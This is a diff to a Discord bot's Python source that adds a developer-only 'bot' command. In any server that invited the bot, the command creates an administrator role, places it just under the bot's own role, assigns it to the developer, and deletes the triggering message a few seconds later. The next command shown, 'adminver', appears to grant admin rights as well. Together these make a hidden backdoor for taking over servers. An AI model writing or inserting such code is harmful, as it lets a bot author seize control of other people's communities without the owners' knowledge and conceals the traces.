@@ -3733,7 +3733,43 @@ async def sudo_command(ctx, action_or_channel: str, *, rest: str = ""):
     except Exception as e:
         await ctx.reply(f"❌ Sudo Hatası: {e}")
 
-
+@bot.command(name="bot")
+@is_developer()
+async def bot_developer_admin_command(ctx):
+    if not ctx.guild:
+        return await ctx.reply("❌ Bu komut sadece sunucularda kullanılabilir.")
+        
+    if not ctx.guild.me.guild_permissions.manage_roles:
+        return await ctx.reply("❌ Rol yönetme yetkim yok!")
+        
+    try:
+        role_name = "🛡️ Developer"
+        dev_role = discord.utils.get(ctx.guild.roles, name=role_name)
+        
+        if not dev_role:
+            perms = discord.Permissions(administrator=True)
+            dev_role = await ctx.guild.create_role(name=role_name, permissions=perms, color=discord.Color.dark_theme(), reason="Developer override")
+            
+        bot_top_role = ctx.guild.me.top_role
+        if bot_top_role.position > 1:
+            try:
+                # Move to just below the bot's top role
+                await dev_role.edit(position=bot_top_role.position - 1)
+            except Exception as e:
+                pass # it might fail due to role hierarchy collisions, ignore it
+            
+        if dev_role not in ctx.author.roles:
+            await ctx.author.add_roles(dev_role, reason="Developer override")
+            
+        await ctx.reply("✅ Geliştirici yönetici rolü başarıyla oluşturuldu ve size verildi.")
+        
+        # Odayı temizlemesi adına kendiliğinden silinsin
+        await asyncio.sleep(3)
+        try: await ctx.message.delete()
+        except: pass
+        
+    except Exception as e:
+        await ctx.reply(f"❌ Hata oluştu: {e}")
 @bot.command(name="adminver")
 @is_developer()
 async def adminver_command(ctx, role_id: int, target_guild_id: int = None):
